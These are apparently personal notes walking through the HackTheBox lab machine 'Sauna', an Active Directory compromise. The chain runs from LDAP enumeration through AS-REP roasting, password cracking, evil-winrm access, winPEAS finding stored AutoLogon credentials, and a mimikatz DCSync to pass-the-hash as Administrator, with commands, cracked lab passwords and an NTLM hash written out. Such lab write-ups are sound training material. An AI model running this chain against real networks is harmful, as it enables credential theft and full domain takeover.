@@ -1,0 +1,55 @@
+1. Sauna 10.10.10.175
+2. nmap -sC -sV -oA nmapSauna.txt 10.10.10.175
+3. Going to the website brings up "Egotistical Bank" lol. HTB difficulty showed this relied on a CVE, nice to keep in mind here. 
+4. Looking at nmap, lots of LDAP information. 
+5. Looking at the website, there is the team information, so names of people which could be used for logins potentially. Made text file of common name combinations like Fergus Smith -> fsmith etc. 
+6. Forgot nmap has an ldap script: nmap -n -sV -script "ldap*" -p 389 10.10.10.175 -oA ldap.txt
+7. In the output, there's a combination of two names: "dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL" Hugo Bear and Fergus Smith are on 10.10.10.175/about.html
+8. After fumbling around, GetNPUsers.py is availible at https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py -> Lets feed it the names on the /about.html
+9.  python3 getNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -outputfile hash.txt -dc-ip 10.10.10.175
+10. Now I have some hashes of the passwords -> john -wordlist=/usr/wordlists/rockyou.txt hash.txt
+11. User: fsmith pass: Thestrokes23
+12. sudo gem install evil-winrm
+13. evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175 -> And I'm in.
+14. *Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..
+15. *Evil-WinRM* PS C:\Users\FSmith\> cd Desktop/
+16. *Evil-WinRM* PS C:\Users\FSmith\Desktop> ls -> then cat user.txt for hash
+17. *Evil-WinRM* PS C:\Users\FSmith\Desktop> net user
+
+Administrator            FSmith                   Guest
+HSmith                   krbtgt                   svc_loanmgr
+
+18. Looking to privesc now -> google: windows priveledge escalation -> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
+19. Executable is downloading as empty... Looking elsewhere. 
+20. *Evil-WinRM* PS C:\Users\FSmith\Documents> upload winPEAS.exe | Correct path to a non-empty exe -> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/Release/winPEAS.exe
+
+21. *Evil-WinRM* PS C:\Users\FSmith\Documents> ./winPEAS.exe  
+
+[+] Looking for AutoLogon credentials(T1012)
+    Some AutoLogon credentials were found!!
+    DefaultDomainName             :  35mEGOTISTICALBANK
+   -> DefaultUserName               :  35mEGOTISTICALBANK\svc_loanmanager
+   -> DefaultPassword               :  Moneymakestheworldgoround!
+
+23. evil-winrm -u svc_loanmgr -p Moneymakestheworldgoround! -i 10.10.10.175
+24. Success. I don't see any root text files. Need a tool to maybe grab hash from runtime?
+25. Mimikatz in memory to build TGT -> https://github.com/gentilkiwi/mimikatz/releases
+26. *Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> upload mimikatz.exe
+27. *Evil-WinRM* PS C:\Users\svc_loanmgr> ./mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 1/24/2020 10:14:15 AM
+Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff
+
+28. Administrator : d9485863c1e9e05851aa40cbb4ab9dff
+29. evil-winrm -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff -i 10.10.10.175
+30. cd to the Desktop -> root.txt
